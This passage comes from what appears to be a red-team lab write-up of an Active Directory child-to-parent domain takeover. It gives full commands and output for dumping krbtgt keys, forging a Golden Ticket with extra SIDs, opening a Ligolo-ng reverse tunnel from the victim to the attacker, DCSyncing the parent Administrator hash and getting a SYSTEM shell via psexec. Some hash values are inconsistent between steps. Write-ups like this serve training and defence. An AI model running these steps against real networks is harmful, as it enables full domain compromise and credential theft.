krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Entering NTDSHashes.__decryptSupplementalInfo
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
krbtgt:aes128-cts-hmac-sha1-96:806d6ea798a9626d3ad00516dd6968b5
krbtgt:des-cbc-md5:ba0b49b6b6455885
[*] Cleaning up ...
```

<p class="indent-paragraph">
  With the krbtgt <code>NTLM hash</code> and <code>AES256 key</code> extracted from the Child Domain Controller (CDC), it is possible to craft a <code>Golden Ticket</code> that impersonates any user in the child domain, including high-privilege accounts. This forged ticket can then be used to access resources or perform lateral movement into the Parent Domain Controller (DC01) according to the established trust relationship.
</p>

### 🧾 krbtgt SID Dump

<p class="indent-paragraph">
  With privileged SYSTEM access on the Child Domain Controller, the next step was to retrieve the domain SIDs for both the child and parent domains using Impacket’s <code>lookupsid.py</code>script. This step is essential for forging a <code>Golden Ticket</code> in the next phase of the attack, as we’ll need the
  SID of the parent domain and the <code>RID</code> of the target account.
</p>

```
~$ proxychains /root/.local/bin/lookupsid.py child/corpmngr:'User4&*&*'@child.warfare.corp
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at child.warfare.corp
[*] StringBinding ncacn_np:child.warfare.corp[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761

~$ proxychains /root/.local/bin/lookupsid.py child/corpmngr:'User4&*&*'@warfare.corp
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at warfare.corp
[*] StringBinding ncacn_np:warfare.corp[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3375883379-808943238-3239386119
```

### 🎟 Golden Ticket Forgery

<p class="indent-paragraph">
  With all necessary artifacts in hand, a Golden Ticket was forged using Impacket’s<code>ticketer.py</code>script. This forged Kerberos ticket enables authentication as a highly privileged account in the parent domain without requiring the original user’s credentials. The following critical components were collected for ticket creation:
</p>

<div style="overflow-x:auto; margin: 2em 0;">
  <table style="border-collapse: collapse; border: 1px solid #444; width:100%; table-layout:fixed;">
    <thead>
      <tr>
        <th style="border: 1px solid #555; padding: 8px 16px; text-align: center; width:30%;">Component</th>
        <th style="border: 1px solid #555; padding: 8px 16px; text-align: center; width:70%;">Value</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td style="border: 1px solid #555; padding: 8px 16px;">krbtgt AES256</td>
        <td style="border: 1px solid #555; padding: 8px 16px; word-break: break-all; white-space: normal;">
          ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
        </td>
      </tr>
      <tr>
        <td style="border: 1px solid #555; padding: 8px 16px;">Child Domain SID</td>
        <td style="border: 1px solid #555; padding: 8px 16px; word-break: break-all; white-space: normal;">
          S-1-5-21-3754860944-83624914-1883974761
        </td>
      </tr>
      <tr>
        <td style="border: 1px solid #555; padding: 8px 16px;">Parent Domain SID</td>
        <td style="border: 1px solid #555; padding: 8px 16px; word-break: break-all; white-space: normal;">
          S-1-5-21-3375883379-808943238-3239386119
        </td>
      </tr>
    </tbody>
  </table>
</div>

<p class="indent-paragraph">
  The <code>ticketer.py</code> command leverages several options to forge a Golden Ticket for <code>corpmngr</code><span class="codefix">:</span> <code>-domain</code> sets the Kerberos realm<code>child.warfare.corp</code><span class="codefix">,</span> <code>-aesKey</code> provides the krbtgt AES256 key for ticket encryption, and <code>-domain-sid</code> specifies the domain’s Security Identifier. The <code>-groups</code> flag injects the primary group RID, <code>516</code> for Domain Users, and <code>-user-id</code> defines the user’s RID <code>1106</code><span class="codefix">.</span> <code>-extra-sid</code> appends two additional SIDs: the parent domain’s Domain Users SID (ending in <code>-516</code>) and the well-known <code>S-1-5-9</code> (Enterprise Domain Controllers), ensuring the ticket carries the necessary group memberships across both child and parent domains.
</p>

```
~$ proxychains /root/.local/bin/ticketer.py -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
/root/.local/bin/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())

[*] PAC_LOGON_INFO
[*] PAC_CLIENT_INFO_TYPE
[*] EncTicketPart
[*] Signing/Encrypting final ticket
[*] PAC_SERVER_CHECKSUM
[*] PAC_PRIVSVR_CHECKSUM
[*] EncTicketPart
[*] EncASRepPart
[*] Saving ticket in corpmngr.ccache
```

<p class="indent-paragraph">
  Despite the deprecation warnings about using <code>datetime.utcnow()</code> (which recommend switching to timezone-aware objects), the <code>ticketer.py</code> script successfully generated a valid TGT for the <code>corpmngr</code> user that embeds both child and parent domain privileges. The final ticket was stored in <code>corpmngr.ccache</code><span class="codefix">,</span> confirming successful ticket creation.
</p>

### 📡 Launching the Ligolo Proxy

<p class="indent-paragraph">
  To synchronize the attacker’s system clock via NTP, full IP-level access to the internal subnet <code>192.168.98.0/24</code> was required. A Ligolo-ng pivot was deployed by creating and activating a TUN interface named <code>ligolo</code><span class="codefix">,</span> then routing the internal network range through it. This established an encrypted tunnel through the compromised host, allowing <code>ntpdate</code> to query the Domain Controller’s time.
</p>

```
~$ sudo ip tuntap add user $(whoami) mode tun ligolo
[sudo] password:

~$ sudo ip route del 192.168.98.0/24 dev tun0

~$ sudo ip link set ligolo up

~$ sudo ip route add 192.168.98.0/24 dev ligolo

~$ ip route
default via 10.10.200.1 dev tun0 proto static metric 50
10.10.200.0/24 dev tun0 proto kernel scope link src 10.10.200.106 metric 50
192.168.80.0/24 via 10.10.200.1 dev tun0 proto static metric 50
192.168.98.0/24 dev ligolo scope link linkdown
```

<p class="indent-paragraph">
  Ligolo-ng was deployed on both ends to create an encrypted HTTP(s) tunnel. <strong>On the attacker host</strong>, the Ligolo server (proxy) was started with a self-signed certificate, listening on port 443:
</p>

```
~$ ./proxy --selfcert --laddr 0.0.0.0:443
WARN[0000] Using automatically generated self-signed certificates (Not recommended)

INFO[0000] listening on 0.0.0.0:443

       Ligolo-ng » INFO[0089] Agent joined. 
       name=privilege@ubuntu-virtual-machine remote="192.168.80.10:34634"
```
<p class="indent-paragraph">
  <strong>On the victim host</strong>, the Ligolo agent was launched to connect back to the attacker’s listener (ignoring the untrusted cert):
</p>

```
~$ ./agent --connect 10.10.200.106:443 --ignore-cert

WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established  addr="10.10.200.106:443"
```

<p class="indent-paragraph">
  Once both sides were running, the <code>ligolo</code> interface carried full IP-level traffic—including UDP, ICMP, NTP, and TCP—through the compromised host, enabling all subsequent internal enumeration and time synchronization.
</p>

```
~$ [Agent : privilege@ubuntu-virtual-machine] »  session
? Specify a session : 1 - privilege@ubuntu-virtual-machine - 192.168.80.10:42010

~$ [Agent : privilege@ubuntu-virtual-machine] » start
INFO[10951] Starting tunnel to privilege@ubuntu-virtual-machine
```

### 🎫 Service Ticket Request via Kerberos Cache

<p class="indent-paragraph">
  <span class="red">Note:</span> Kerberos authentication will fail with <code>KRB_AP_ERR_SKEW</code> if the attacker’s clock drifts from the Domain Controller’s time. Because NTP relies on UDP, this requires a full-stack pivot (e.g. via Ligolo) before running <code>ntpdate</code><span class="codefix">.</span> The script below automates time synchronization by querying the DC over the Ligolo tunnel and setting the local clock in UTC.
</p>

```
~$ cat sync_time_from_dc.sh

#!/bin/bash
# Set the IP address of the Domain Controller
DC_IP="192.168.98.2"

echo "[*] Querying current time from Domain Controller ($DC_IP)..."
dc_time=$(ntpdate -q "$DC_IP" | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')

if [ -z "$dc_time" ]; then
  echo "[-] Failed to retrieve time from Domain Controller."
  exit 1
fi

echo "[+] DC time retrieved: $dc_time UTC"
echo "[*] Setting local system time to match DC..."
# Update the system clock (UTC)
sudo date -u -s "$dc_time"

echo "[+] Local time successfully synchronized with DC."

~$ ./sync_time_from_dc.sh
[*] Querying current time from Domain Controller (192.168.98.2) ...
[+] DC time retrieved: 2025-05-03 20:26:04 UTC
[*] Setting local system time to match DC ...
Sat May  3 20:26:04 UTC 2025
[+] Local time successfully synchronized with DC.
```

<p class="indent-paragraph">
  After loading the forged Golden Ticket into the Kerberos cache:
  </p>

```
~$ export KRB5CCNAME=corpmngr.ccache
```

<p class="indent-paragraph">
A Service Ticket for the CIFS SPN on the parent DC was requested. Impacket’s <code>getST.py</code> was invoked to obtain the TGS for <code>CIFS/child.warfare.corp</code><span class="codefix">,</span> connecting to both the child and parent KDCs and saving the resulting ticket to a new cache file.
</p>

```
~$ proxychains /root/.local/bin/getST.py -spn 'CIFS/dc01.warfare.corp' child.warfare.corp/corpmngr -debug -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
[+] Using Kerberos Cache: corpmngr.ccache
[*] Returning cached credential for KRBTGT/CHILD.WARFARE.CORP@CHILD.WARFARE.CORP
[*] Using TGT from cache
[+] Username retrieved from CCache: corpmngr
[*] Getting ST for user
[+] Trying to connect to KDC at CHILD.WARFARE.CORP:88
[*] Trying to connect to KDC at WARFARE.CORP:88
[*] Saving ticket in corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
```
### 🛡️ Dumping Administrator Credentials

<p class="indent-paragraph">
  With a valid <code>Service Ticket (CIFS)</code> issued for the parent domain controller <code>dc01.warfare.corp</code> using the forged TGT for the user corpmngr, we proceed to extract credentials from the target system. This technique leverages the privileges embedded in the Golden Ticket. First, we export the <code>.ccache</code> file generated by the <code>getST.py</code> script to ensure Impacket tools correctly reference the Kerberos authentication context:
</p>

```
~$ export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
```

<p class="indent-paragraph">
  Then, using <code>secretsdump.py</code> with Kerberos authentication flags, we connect to the target domain controller and extract sensitive information, including the <code>NTLM hashes</code> of domain users.
</p>

```
~$ proxychains /root/.local/bin/secretdump.py -k -no-pass dc01.warfare.corp \
    -just-dc-user 'warfare\Administrator' -debug
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
[+] Using Kerberos Cache: corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
[*] Domain retrieved from CCache: CHILD.WARFARE.CORP
[*] Returning cached credential for CIFS/DC01.WARFARE.CORP@WARFARE.CORP
[*] Using TGS from cache
[*] Calling DRSUAPI method to get NTDS.DIT secrets
[+] Calling DRScrackNames for warfare\Administrator
[+] Calling DRSGetNCChanges for {17446816-c072-445e-ac9b-c0e28630bed6}
[*] Entering NTDSHashes.__decryptHash
[*] Decrypting hash for user: CN=Administrator,CN=Users,DC=warfare,DC=corp
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcdfd60:::
[*] Leaving NTDSHashes.__decryptHash
[*] Entering NTDSHashes.__decryptSupplementalInfo
[*] Leaving NTDSHashes.__decryptSupplementalInfo
[*] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:ca1d92ce23064e3c43c08f9a5aff06f8fe002c10ab1031da11152611b2
Administrator:aes128-cts-hmac-sha1-96:33d3f5778fade9945053a05ce2f18445
Administrator:des-cbc-md5:3ba88a586240f423
[*] Cleaning up ...
```

<p class="indent-paragraph">
  Upon execution, the tool dumps the contents of the Security Account Manager (SAM) database and LSA secrets, including the NTLM hash of the <code>Administrator account</code> in the parent domain.
</p>

### 🎯 SYSTEM Shell on Domain Controller

<p class="indent-paragraph">
  With SYSTEM-level shell on the Domain Controller (dc01), complete control over the parent domain environment was achieved. From here, full Active Directory compromise is possible—creating backdoor accounts, extracting additional secrets, or deploying persistent agents. This level of access represents the pinnacle of the engagement, validating the end-to-end Red Team objective: identify and exploit vulnerabilities to demonstrate the impact of an AD takeover.
</p>

```
~$ proxychains /root/.local/bin/psexec.py -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /root/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket
[+] StringBinding ncacn_np:dc01.warfare.corp[\pipe\svcctl]
[*] Requesting shares on dc01.warfare.corp.....
[*] Found writable share ADMIN$
[*] Uploading file FGxzltgq.exe
[*] Opening SVCManager on dc01.warfare.corp.....
[*] Creating service NLai on dc01.warfare.corp.....
[*] Starting service NLai.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
dc01

C:\Windows\system32> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.98.2
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.98.1
```

</div>